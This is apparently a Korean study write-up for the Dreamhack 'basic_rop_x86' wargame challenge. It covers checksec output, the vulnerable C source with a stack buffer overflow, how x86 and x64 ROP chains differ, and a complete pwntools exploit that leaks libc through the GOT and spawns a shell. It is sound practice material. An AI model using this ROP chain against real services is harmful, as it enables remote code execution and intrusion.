# Exploit Tech: ROP x86

# 분석 및 설계

## 분석

---

checksec을 사용하여 적용된 보호 기법을 파악한다.

```c
$ checksec basic_rop_x86
[*]
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

ASLR과 NX가 적용되어 있다.
canary와 PIE는 적용되지 않았다.

## 코드 분석

---

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}
```

buf의 크기는 0x40이지만 read() 함수에서 buf 변수에 0x400 크기의 입력을 받고 있다. 따라서 스택 버퍼 오버플로우가 발생한다.

# 익스플로잇

## 익스플로잇

---

x64에서의 과정과 동일하지만 함수 호출 규약에서 차이가 있다.

x64 아키텍쳐에서는 함수를 부를 때 함수의 주소와 함께, 이미 레지스터에 저장되어 있는 값들을 인자로 실행되어 payload에 (레지스터 세팅 과정) + (함수의 주소)와 같은 형식으로 전달해주었다. basic_rop_x64에서 사용한 익스플로잇 코드

```c
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(8)
payload += p64(write_plt)
```

그러나, x86의 경우 레지스터가 아닌, 스택에서 값을 pop하여 인자로 전달한다. 순서 또한 반대로, (함수의 주소) + (pop 과정) 과 같은 형태로 payload를 작성해야 한다. 또한 x64와의 차이점은 pop 과정을 진행하는 가젯을 찾을 때, pop 횟수만 중요할 뿐, 어떤 레지스터에 값이 저장되는지는 중요하지 않다.

```c
payload += p32(pop3_ret)
payload += p32(1) + p32(read_got) + p32(4)
payload += p32(main)
```

이때, pop3_ret 가젯은 앞서 말했듯이 어떤 레지스터를 pop하든 상관없이, 횟수만 3회이면 된다.

```c
pop3_ret = r.find_gadget(['pop esi', 'pop edi', 'pop ebp', 'ret'])[0]
```

### 이해가 안 됐던 부분

왜 순서가 반대인가?

→ 스택에 push를 하는 경우 스택의 주소가 -4가되어 작아지지만, payload를 작성할 때는 주소가 커지기 때문에 함수의 인자가 함수 바깥에서 더 높은 주소에 있는 x86의 경우 순서가 반대가 된다.

pop의 횟수만 중요한 이유가 무엇인가?

→ pop을 할 때 값이 저장되는게 중요한게 아니라, 단순히 스택 포인터를 옮기기 위한 것이므로 횟수만 중요하다.

```c
높은 주소   ┌──────────────┐
            │    main      │
            ├──────────────┤
            │    4         │  ← ESP+12, 세 번째 인자
            ├──────────────┤
            │  read_got    │  ← ESP+8, 두 번째 인자
            ├──────────────┤
            │    1         │  ← ESP+4, 첫 번째 인자
            ├──────────────┤
   ESP →    │  pop3_ret    │  ← write가 리턴 주소로 인식
낮은 주소   └──────────────┘
```

```c
높은 주소   ┌──────────────┐
   ESP →    │    main      │  ← pop 3번으로 인자 3개 치움, ret하면 여기로
            ├──────────────┤
            │    4         │  ← pop으로 꺼냄
            ├──────────────┤
            │  read_got    │  ← pop으로 꺼냄
            ├──────────────┤
            │    1         │  ← pop으로 꺼냄
낮은 주소   └──────────────┘
```

## exploit.py

---

```c
from pwn import *

TEST = False
if TEST:
    p = process("./basic_rop_x86")
    e = ELF("./basic_rop_x86")
    libc = e.libc
else:
    p = remote('host3.dreamhack.games', 13458)
    e = ELF("./basic_rop_x86")
    libc = ELF("./libc.so.6")

r = ROP(e)

read_plt = e.plt["read"]
read_got = e.got["read"]
write_plt = e.plt["write"]
write_got = e.got["write"]
main = e.symbols["main"]

read_offset = libc.symbols["read"]
system_offset = libc.symbols["system"]
sh_offset = list(libc.search(b"/bin/sh"))[0]

pop_ret = r.find_gadget(['pop ebp', 'ret'])[0]
pop2_ret = r.find_gadget(['pop edi', 'pop ebp', 'ret'])[0]
pop3_ret = r.find_gadget(['pop esi', 'pop edi', 'pop ebp', 'ret'])[0]

# Stage 1
payload = b'A' * 0x48
payload += p32(write_plt)
payload += p32(pop3_ret)
payload += p32(1) + p32(read_got) + p32(4)
payload += p32(main)

p.send(payload)
p.recvuntil(b'A' * 0x40)

# Calculate libc_base
read = u32(p.recvn(4))
libc_base = read - read_offset
system = libc_base + system_offset
sh = libc_base + sh_offset

print(hex(libc_base))
print(hex(system))

payload = b'A' * 0x48
payload += p32(system)
payload += p32(pop_ret)
payload += p32(sh)

p.send(payload)
p.recvuntil(b'A' * 0x40)

p.interactive()
```